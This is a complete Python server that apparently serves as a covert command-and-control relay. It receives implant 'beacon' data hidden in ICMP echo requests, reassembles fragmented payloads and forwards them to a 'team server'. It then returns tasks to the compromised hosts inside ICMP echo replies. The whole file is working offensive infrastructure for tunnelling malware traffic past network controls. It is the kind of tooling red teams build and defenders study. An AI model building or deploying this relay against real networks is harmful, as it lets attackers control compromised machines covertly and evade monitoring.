#!/usr/bin/env python3
import threading
import socket
import struct
import queue
import sys
import logging
import signal
import time
import argparse
import json
import os
from typing import Dict, Tuple, Optional, Any, Set, List
from dataclasses import dataclass, asdict
from contextlib import contextmanager
from enum import IntEnum, IntFlag


class ICMPType(IntEnum):
    """ICMP message types."""
    ECHO_REQUEST = 8
    ECHO_REPLY = 0


class FragmentationFlags(IntFlag):
    """Fragmentation flags for packet handling."""
    FRAGMENTED = 0x00000001
    FIRST_FRAG = 0x00000010
    LAST_FRAG = 0x00000100
    FETCH_FRAG = 0x00001000


class PacketType(IntEnum):
    """Packet types for client/server communication."""
    # Client types
    BEACON_DATA = 0
    REQUEST_TS_REPLY = 1
    
    # UDC2 server types
    ACK = 2
    TASK = 3


@dataclass
class Config:
    """Server configuration parameters."""
    ts_addr: str = '127.0.0.1'
    ts_port: int = 2222
    listen_addr: str = '0.0.0.0'
    max_fragment_size: int = 65491
    log_level: str = 'INFO'
    # Beacon relay connection timeout. Consider setting this slightly above
    # your checkin interval to avoid premature timeouts or remove it entirely
    # if you want to allow indefinite waits.
    connection_timeout: int = 300  # 5 minutes
    max_connections: int = 1000
    enable_metrics: bool = False
    config_file: Optional[str] = None

    @classmethod
    def from_file(cls, file_path: str) -> 'Config':
        """Load configuration from JSON file."""
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
            return cls(**data)
        except Exception as e:
            logging.error(f"Failed to load config from {file_path}: {e}")
            return cls()

    def save_to_file(self, file_path: str) -> None:
        """Save configuration to JSON file."""
        try:
            with open(file_path, 'w') as f:
                json.dump(asdict(self), f, indent=2)
        except Exception as e:
            logging.error(f"Failed to save config to {file_path}: {e}")


class ServerMetrics:
    """Server metrics and monitoring."""
    
    def __init__(self):
        self.packets_received = 0
        self.packets_sent = 0
        self.fragments_processed = 0
        self.active_connections = 0
        self.errors_count = 0
        self.start_time = time.time()
        self._lock = threading.Lock()
    
    def increment_packets_received(self) -> None:
        with self._lock:
            self.packets_received += 1
    
    def increment_packets_sent(self) -> None:
        with self._lock:
            self.packets_sent += 1
    
    def increment_fragments_processed(self) -> None:
        with self._lock:
            self.fragments_processed += 1
    
    def increment_errors(self) -> None:
        with self._lock:
            self.errors_count += 1
    
    def set_active_connections(self, count: int) -> None:
        with self._lock:
            self.active_connections = count
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current server statistics."""
        with self._lock:
            uptime = time.time() - self.start_time
            return {
                'uptime_seconds': uptime,
                'packets_received': self.packets_received,
                'packets_sent': self.packets_sent,
                'fragments_processed': self.fragments_processed,
                'active_connections': self.active_connections,
                'errors_count': self.errors_count,
                'packets_per_second': self.packets_received / uptime if uptime > 0 else 0
            }


class ICMPPacketHandler:
    """Handles ICMP packet parsing and construction."""
    
    # Header formats
    CUSTOM_HDR_FMT = '<IIII'
    CUSTOM_HDR_SIZE = struct.calcsize(CUSTOM_HDR_FMT)
    ICMP_HDR_FMT = '!BBHHH'
    ICMP_HDR_SIZE = struct.calcsize(ICMP_HDR_FMT)
    
    @staticmethod
    def checksum(data: bytes) -> int:
        """Compute the Internet Checksum of the supplied data."""
        s = 0
        # Sum 16-bit words
        for i in range(0, len(data) - 1, 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        # Handle odd length
        if len(data) % 2:
            s += data[-1] << 8
        # Fold to 16 bits
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return (~s) & 0xFFFF

    @classmethod
    def parse_icmp_packet(cls, packet: bytes) -> Tuple[int, int, int, int, int, bytes]:
        """
        Parse an ICMP packet, handling IPv4 header if present.
        
        Returns:
            Tuple of (icmp_type, code, checksum, ident, seq, payload)
        """
        # If first nibble == 4, assume IPv4 header present
        first_byte = packet[0]
        if first_byte >> 4 == 4:
            ihl = (first_byte & 0x0F) * 4
        else:
            ihl = 0

        icmp_offset = ihl
        icmp_hdr = packet[icmp_offset:icmp_offset + cls.ICMP_HDR_SIZE]
        
        if len(icmp_hdr) < cls.ICMP_HDR_SIZE:
            raise ValueError("Invalid ICMP header size")
            
        icmp_type, code, recv_cksum, ident, seq = struct.unpack(cls.ICMP_HDR_FMT, icmp_hdr)
        payload = packet[icmp_offset + cls.ICMP_HDR_SIZE:]
        return icmp_type, code, recv_cksum, ident, seq, payload

    @classmethod
    def send_icmp_reply(cls, sock: socket.socket, src_ip: str, ident: int, seq: int, 
                       custom_type: int, custom_id: int, flags: int, frag_idx: int, 
                       payload_data: bytes = b'') -> int:
        """
        Construct and send an ICMP echo reply with custom header.
        
        Returns:
            Size of the sent packet in bytes
        """
        try:
            # Build custom header + payload
            reply_payload = struct.pack(cls.CUSTOM_HDR_FMT,
                                       custom_type, custom_id, flags, frag_idx) + payload_data
            
            # Build ICMP header with zero checksum placeholder
            header = struct.pack(cls.ICMP_HDR_FMT,
                                ICMPType.ECHO_REPLY, 0, 0, ident, seq)
            
            # Compute correct checksum over header + payload
            full_packet = header + reply_payload
            chksum = cls.checksum(full_packet)
            
            # Rebuild header with real checksum
            header = struct.pack(cls.ICMP_HDR_FMT,
                                ICMPType.ECHO_REPLY, 0, chksum, ident, seq)
            
            # Send the packet
            sock.sendto(header + reply_payload, (src_ip, 0))
            return len(header) + len(reply_payload)
            
        except Exception as e:
            logging.error(f"Failed to send ICMP reply to {src_ip}: {e}")
            raise


class BeaconManager:
    """Manages beacon state and fragmentation."""
    
    def __init__(self):
        self.beacons: Dict[int, Dict[str, Any]] = {}
        self.beacon_out: Dict[int, Dict[str, Any]] = {}
        self.lock = threading.Lock()
        self.fragment_timeout = 300  # 5 minutes
        
    def add_fragment(self, custom_id: int, frag_idx: int, data: bytes, 
                    flags: int) -> Optional[bytes]:
        """
        Add a fragment to a beacon. Returns complete payload if all fragments received.
        """
        with self.lock:
            if flags & FragmentationFlags.FIRST_FRAG:
                if custom_id in self.beacons:
                    logging.warning(f"First fragment received again for existing ID {hex(custom_id)}")
                    return None
                self.beacons[custom_id] = {
                    'fragments': {},
                    'timestamp': time.time()
                }
            
            if custom_id not in self.beacons:
                logging.error(f"Fragment received for unknown ID {hex(custom_id)}")
                return None
            
            # Store the fragment
            self.beacons[custom_id]['fragments'][frag_idx] = data
            self.beacons[custom_id]['timestamp'] = time.time()
            
            if flags & FragmentationFlags.LAST_FRAG:
                # Assemble complete payload
                fragments = self.beacons[custom_id]['fragments']
                try:
                    full_payload = b''.join(fragments[i] for i in sorted(fragments))
                    del self.beacons[custom_id]
                    return full_payload
                except KeyError as e:
                    logging.error(f"Missing fragment {e} for ID {hex(custom_id)}")
                    del self.beacons[custom_id]
                    return None
            
            return None
    
    def add_response(self, custom_id: int, response_frame: bytes) -> None:
        """Add a response frame for a beacon."""
        with self.lock:
            if custom_id in self.beacon_out:
                logging.error(f"Response already exists for ID {hex(custom_id)}")
                return
            
            self.beacon_out[custom_id] = {
                'frame': response_frame,
                'fragments': {},
                'timestamp': time.time()
            }
    
    def get_response(self, custom_id: int) -> Optional[Dict[str, Any]]:
        """Get response for a beacon ID."""
        with self.lock:
            return self.beacon_out.get(custom_id)
    
    def remove_response(self, custom_id: int) -> None:
        """Remove response for a beacon ID."""
        with self.lock:
            self.beacon_out.pop(custom_id, None)
    
    def cleanup_expired(self) -> None:
        """Clean up expired beacon fragments and responses."""
        current_time = time.time()
        with self.lock:
            # Clean up expired fragments
            expired_beacons = [
                beacon_id for beacon_id, beacon_data in self.beacons.items()
                if current_time - beacon_data['timestamp'] > self.fragment_timeout
            ]
            for beacon_id in expired_beacons:
                logging.warning(f"Cleaning up expired beacon fragments for ID {hex(beacon_id)}")
                del self.beacons[beacon_id]
            
            # Clean up expired responses
            expired_responses = [
                beacon_id for beacon_id, response_data in self.beacon_out.items()
                if current_time - response_data['timestamp'] > self.fragment_timeout
            ]
            for beacon_id in expired_responses:
                logging.warning(f"Cleaning up expired response for ID {hex(beacon_id)}")
                del self.beacon_out[beacon_id]


class ConnectionManager:
    """Manages connections to the team server."""
    
    def __init__(self, config: Config):
        self.config = config
        self.active_connections: Dict[int, socket.socket] = {}
        self.lock = threading.Lock()
        
    def get_connection(self, custom_id: int) -> socket.socket:
        """Get or create connection for a custom ID."""
        with self.lock:
            if custom_id not in self.active_connections:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.config.connection_timeout)
                    sock.connect((self.config.ts_addr, self.config.ts_port))
                    
                    # Send initial "go" frame
                    self._send_frame(sock, b"go")
                    
                    self.active_connections[custom_id] = sock
                    logging.info(f"Connected to team server for custom ID {hex(custom_id)}")
                    
                except socket.timeout:
                    logging.error(f"Timeout connecting to team server for ID {hex(custom_id)}")
                    raise
                except Exception as e:
                    logging.error(f"Failed to connect to team server for ID {hex(custom_id)}: {e}")
                    raise
            
            return self.active_connections[custom_id]
    
    def close_connection(self, custom_id: int) -> None:
        """Close connection for a custom ID."""
        with self.lock:
            if custom_id in self.active_connections:
                try:
                    self.active_connections[custom_id].close()
                except Exception as e:
                    logging.warning(f"Error closing connection for ID {hex(custom_id)}: {e}")
                finally:
                    del self.active_connections[custom_id]
    
    def close_all_connections(self) -> None:
        """Close all active connections."""
        with self.lock:
            # Safely extract all connections while holding the lock
            connections_to_close = [(custom_id, sock) for custom_id, sock in self.active_connections.items()]
            # Clear the dictionary immediately
            self.active_connections.clear()
        
        # Close all sockets outside the lock to avoid any potential issues
        for custom_id, sock in connections_to_close:
            try:
                sock.close()
                logging.debug(f"Closed connection for ID {hex(custom_id)}")
            except Exception as e:
                logging.warning(f"Error closing connection for ID {hex(custom_id)}: {e}")
    
    @staticmethod
    def _send_frame(sock: socket.socket, payload: bytes) -> None:
        """Send a frame with 4-byte length prefix."""
        length = len(payload)
        frame = struct.pack('<I', length) + payload
        sock.sendall(frame)
    
    @staticmethod
    def _receive_frame(sock: socket.socket) -> bytes:
        """Receive a frame: 4-byte length prefix followed by payload."""
        length_bytes = sock.recv(4)
        if len(length_bytes) != 4:
            raise ConnectionError("Failed to read frame length")
        
        length = struct.unpack('<I', length_bytes)[0]
        if length > 10 * 1024 * 1024:  # 10MB limit
            raise ValueError(f"Frame too large: {length} bytes")
        
        payload = b''
        while len(payload) < length:
            chunk = sock.recv(length - len(payload))
            if not chunk:
                raise ConnectionError("Connection closed while reading payload")
            payload += chunk
        
        # Return the complete frame (length prefix + payload) for team server protocol
        return length_bytes + payload


class ICMPServer:
    """ICMP UDC2 Server implementation."""
    
    def __init__(self, config: Config):
        self.config = config
        self.beacon_manager = BeaconManager()
        self.connection_manager = ConnectionManager(config)
        self.packet_handler = ICMPPacketHandler()
        self.metrics = ServerMetrics() if config.enable_metrics else None
        
        self.shutdown_event = threading.Event()
        self.relay_queue: queue.Queue = queue.Queue()
        self.threads: List[threading.Thread] = []
        
        # Setup logging
        self._setup_logging()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _setup_logging(self) -> None:
        """Configure logging for the server."""
        log_format = '%(asctime)s - %(name)s - %(levelname)s - [%(threadName)s] %(message)s'
        
        handlers = [logging.StreamHandler(sys.stdout)]
        
        # Add file handler if possible
        try:
            handlers.append(logging.FileHandler('icmp_udc2_server.log'))
        except Exception as e:
            print(f"Warning: Could not create log file: {e}")
        
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format=log_format,
            handlers=handlers
        )
        
        # Reduce noise from libraries
        logging.getLogger('urllib3').setLevel(logging.WARNING)
    
    def _signal_handler(self, signum: int, frame) -> None:
        """Handle shutdown signals gracefully."""
        logging.info(f"Received signal {signum}, initiating graceful shutdown...")
        self.shutdown_event.set()
    
    def _validate_packet(self, payload: bytes, src_ip: str) -> bool:
        """Validate incoming packet data."""
        if len(payload) < self.packet_handler.CUSTOM_HDR_SIZE:
            logging.warning(f"[{src_ip}] Payload too small ({len(payload)} bytes)")
            if self.metrics:
                self.metrics.increment_errors()
            return False
        
        # Additional validation could be added here
        return True
    
    def icmp_listener(self) -> None:
        """Listen for incoming ICMP echo requests and process them."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
                sock.bind((self.config.listen_addr, 0))
                logging.info(f"Listening for ICMP echo requests on {self.config.listen_addr}")
                
                while not self.shutdown_event.is_set():
                    try:
                        # Use select with timeout to allow checking shutdown event
                        sock.settimeout(1.0)
                        packet, (src_ip, _) = sock.recvfrom(65535)
                        
                        if self.metrics:
                            self.metrics.increment_packets_received()
                        
                        self._process_icmp_packet(sock, packet, src_ip)
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logging.error(f"Error processing ICMP packet: {e}")
                        if self.metrics:
                            self.metrics.increment_errors()
                        
        except PermissionError:
            logging.error("Error: This script requires administrative/root privileges.")
            sys.exit(1)
        except Exception as e:
            logging.error(f"Fatal error in ICMP listener: {e}")
            self.shutdown_event.set()
    
    def _process_icmp_packet(self, sock: socket.socket, packet: bytes, src_ip: str) -> None:
        """Process a single ICMP packet."""
        try:
            icmp_type, code, recv_cksum, ident, seq, payload = \
                self.packet_handler.parse_icmp_packet(packet)
            
            # Only handle Echo Requests
            if icmp_type != ICMPType.ECHO_REQUEST:
                return
            
            if not self._validate_packet(payload, src_ip):
                return
            
            # Unpack custom header
            custom_type, custom_id, flags, frag_idx = struct.unpack(
                self.packet_handler.CUSTOM_HDR_FMT,
                payload[:self.packet_handler.CUSTOM_HDR_SIZE]
            )
            user_data = payload[self.packet_handler.CUSTOM_HDR_SIZE:]
            
            if custom_type == PacketType.BEACON_DATA:
                self._handle_beacon_data(sock, src_ip, ident, seq, custom_id, flags, frag_idx, user_data)
            elif custom_type == PacketType.REQUEST_TS_REPLY:
                self._handle_ts_request(sock, src_ip, ident, seq, custom_id, flags, frag_idx)
            else:
                logging.warning(f"[{src_ip}] Unknown custom type {custom_type} received")
                
        except Exception as e:
            logging.error(f"Error processing packet from {src_ip}: {e}")
            if self.metrics:
                self.metrics.increment_errors()
    
    def _handle_beacon_data(self, sock: socket.socket, src_ip: str, ident: int, seq: int,
                           custom_id: int, flags: int, frag_idx: int, user_data: bytes) -> None:
        """Handle beacon data packets."""
        logging.debug(f"[{src_ip}] Received beacon data (ID: {hex(custom_id)}, "
                     f"Flags: {hex(flags)}, Fragment: {frag_idx})")
        
        if flags & FragmentationFlags.FRAGMENTED:
            if self.metrics:
                self.metrics.increment_fragments_processed()
            
            full_payload = self.beacon_manager.add_fragment(custom_id, frag_idx, user_data, flags)
            if full_payload is not None:
                logging.info(f"[{src_ip}] Assembled complete beacon data from fragments "
                           f"(ID: {hex(custom_id)}) with length {len(full_payload)} bytes")
                self.relay_queue.put((custom_id, full_payload))
        else:
            logging.info(f"[{src_ip}] Received complete beacon data (ID: {hex(custom_id)})")
            self.relay_queue.put((custom_id, user_data))
        
        # Send ACK reply
        try:
            packet_size = self.packet_handler.send_icmp_reply(
                sock, src_ip, ident, seq, PacketType.ACK, custom_id, 0, 0)
            logging.debug(f"[{src_ip}] Sent ACK reply ({packet_size} bytes)")
            
            if self.metrics:
                self.metrics.increment_packets_sent()
                
        except Exception as e:
            logging.error(f"Failed to send ACK to {src_ip}: {e}")
    
    def _handle_ts_request(self, sock: socket.socket, src_ip: str, ident: int, seq: int,
                          custom_id: int, flags: int, frag_idx: int) -> None:
        """Handle team server reply requests."""
        logging.debug(f"[{src_ip}] Received request for TS reply (ID: {hex(custom_id)}, "
                     f"Flags: {hex(flags)}, Fragment: {frag_idx})")
        
        response_data = self.beacon_manager.get_response(custom_id)
        if not response_data:
            logging.debug(f"[{src_ip}] No response available for ID {hex(custom_id)}")
            return
        
        try:
            if flags & FragmentationFlags.FETCH_FRAG:
                self._send_fragment(sock, src_ip, ident, seq, custom_id, frag_idx, response_data)
            else:
                self._send_response(sock, src_ip, ident, seq, custom_id, response_data)
                
            if self.metrics:
                self.metrics.increment_packets_sent()
                
        except Exception as e:
            logging.error(f"Failed to send response to {src_ip}: {e}")
    
    def _send_fragment(self, sock: socket.socket, src_ip: str, ident: int, seq: int,
                      custom_id: int, frag_idx: int, response_data: Dict[str, Any]) -> None:
        """Send a specific fragment to the client."""
        if 'fragments' not in response_data or frag_idx not in response_data['fragments']:
            logging.warning(f"[{src_ip}] Requested fragment {frag_idx} not available for ID {hex(custom_id)}")
            return
        
        fragment = response_data['fragments'][frag_idx]
        reply_flags = FragmentationFlags.FRAGMENTED
        
        if frag_idx == len(response_data['fragments']) - 1:
            reply_flags |= FragmentationFlags.LAST_FRAG
        
        packet_size = self.packet_handler.send_icmp_reply(
            sock, src_ip, ident, seq, PacketType.TASK, custom_id, reply_flags, frag_idx, fragment)
        
        logging.debug(f"[{src_ip}] Sent fragment {frag_idx} ({packet_size} bytes)")
        
        # Clean up if this was the last fragment
        if reply_flags & FragmentationFlags.LAST_FRAG:
            self.beacon_manager.remove_response(custom_id)
    
    def _send_response(self, sock: socket.socket, src_ip: str, ident: int, seq: int,
                      custom_id: int, response_data: Dict[str, Any]) -> None:
        """Send response to client, fragmenting if necessary."""
        return_payload = response_data['frame']
        
        if len(return_payload) > self.config.max_fragment_size:
            # Fragment the response
            fragments = [
                return_payload[i:i+self.config.max_fragment_size]
                for i in range(0, len(return_payload), self.config.max_fragment_size)
            ]
            
            # Store fragments in response data
            response_data['fragments'] = {i: frag for i, frag in enumerate(fragments)}
            
            # Send first fragment
            first_fragment = fragments[0]
            packet_size = self.packet_handler.send_icmp_reply(
                sock, src_ip, ident, seq, PacketType.TASK, custom_id,
                FragmentationFlags.FIRST_FRAG | FragmentationFlags.FRAGMENTED, 0, first_fragment)
            
            logging.info(f"[{src_ip}] Sent first fragment ({packet_size} bytes)")
        else:
            # Send complete response
            packet_size = self.packet_handler.send_icmp_reply(
                sock, src_ip, ident, seq, PacketType.TASK, custom_id, 0, 0, return_payload)
            
            logging.info(f"[{src_ip}] Sent complete task ({packet_size} bytes)")
            self.beacon_manager.remove_response(custom_id)
    
    def ts_relay_worker(self) -> None:
        """Worker thread for relaying data to team server."""
        logging.info("Team server relay worker started")
        
        while not self.shutdown_event.is_set():
            try:
                # Use timeout to allow checking shutdown event
                try:
                    custom_id, payload = self.relay_queue.get(timeout=1.0)
                except queue.Empty:
                    continue
                
                if custom_id is None:
                    continue
                
                self._relay_to_team_server(custom_id, payload)
                self.relay_queue.task_done()
                
            except Exception as e:
                logging.error(f"Error in team server relay: {e}")
                if self.metrics:
                    self.metrics.increment_errors()
    
    def _relay_to_team_server(self, custom_id: int, payload: bytes) -> None:
        """Relay payload to team server and handle response."""
        try:
            sock = self.connection_manager.get_connection(custom_id)
            
            # Send payload to team server
            sock.sendall(payload)
            logging.debug(f"Payload for custom ID {hex(custom_id)} relayed successfully")
            
            # Receive response
            response_frame = self.connection_manager._receive_frame(sock)
            
            # Store response for client retrieval
            self.beacon_manager.add_response(custom_id, response_frame)
            
            if self.metrics:
                self.metrics.set_active_connections(len(self.connection_manager.active_connections))
                
        except Exception as e:
            logging.error(f"Error communicating with team server for ID {hex(custom_id)}: {e}")
            self.connection_manager.close_connection(custom_id)
            if self.metrics:
                self.metrics.increment_errors()
    
    def cleanup_worker(self) -> None:
        """Worker thread for periodic cleanup tasks."""
        logging.info("Cleanup worker started")
        
        while not self.shutdown_event.is_set():
            try:
                # Perform cleanup every 30 seconds
                if self.shutdown_event.wait(30):
                    break
                
                self.beacon_manager.cleanup_expired()
                
                if self.metrics:
                    stats = self.metrics.get_stats()
                    logging.info(f"Server stats: {stats}")
                    
            except Exception as e:
                logging.error(f"Error in cleanup worker: {e}")
    
    def start(self) -> None:
        """Start the server and all worker threads."""
        logging.info("Starting ICMP UDC2 Server...")
        
        # Start worker threads
        threads = [
            threading.Thread(target=self.icmp_listener, name="ICMPListener", daemon=True),
            threading.Thread(target=self.ts_relay_worker, name="TSRelayWorker", daemon=True),
            threading.Thread(target=self.cleanup_worker, name="CleanupWorker", daemon=True)
        ]
        
        for thread in threads:
            thread.start()
            self.threads.append(thread)
        
        logging.info("Server started successfully")
        
        # Main loop
        try:
            while not self.shutdown_event.is_set():
                self.shutdown_event.wait(1)
        except KeyboardInterrupt:
            logging.info("Keyboard interrupt received")
        finally:
            self._shutdown()
    
    def _shutdown(self) -> None:
        """Perform graceful shutdown."""
        logging.info("Initiating graceful shutdown...")
        
        # Signal shutdown
        self.shutdown_event.set()
        
        # Close all connections
        self.connection_manager.close_all_connections()
        
        # Wait for threads to finish (with timeout)
        for thread in self.threads:
            thread.join(timeout=5.0)
            if thread.is_alive():
                logging.warning(f"Thread {thread.name} did not shut down gracefully")
        
        logging.info("Server shutdown complete")


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='ICMP UDC2 Server')
    
    parser.add_argument('--config', '-c', type=str, 
                       help='Path to configuration file')
    parser.add_argument('--ts-addr', type=str, default='127.0.0.1',
                       help='Team server address (default: 127.0.0.1)')
    parser.add_argument('--ts-port', type=int, default=2222,
                       help='Team server port (default: 2222)')
    parser.add_argument('--listen-addr', type=str, default='0.0.0.0',
                       help='Listen address (default: 0.0.0.0)')
    parser.add_argument('--log-level', type=str, default='INFO',
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       help='Log level (default: INFO)')
    parser.add_argument('--enable-metrics', action='store_true',
                       help='Enable metrics collection')
    parser.add_argument('--generate-config', type=str,
                       help='Generate a sample configuration file and exit')
    
    return parser.parse_args()


def main():
    """Main entry point."""
    args = parse_arguments()
    
    # Generate config file if requested
    if args.generate_config:
        config = Config()
        config.save_to_file(args.generate_config)
        print(f"Sample configuration file generated: {args.generate_config}")
        return
    
    # Load configuration
    if args.config:
        config = Config.from_file(args.config)
    else:
        config = Config()
    
    # Override config with command line arguments
    if args.ts_addr != '127.0.0.1':
        config.ts_addr = args.ts_addr
    if args.ts_port != 2222:
        config.ts_port = args.ts_port
    if args.listen_addr != '0.0.0.0':
        config.listen_addr = args.listen_addr
    if args.log_level != 'INFO':
        config.log_level = args.log_level
    if args.enable_metrics:
        config.enable_metrics = True
    
    # Create and start server
    server = ICMPServer(config)
    server.start()


if __name__ == '__main__':
    main()
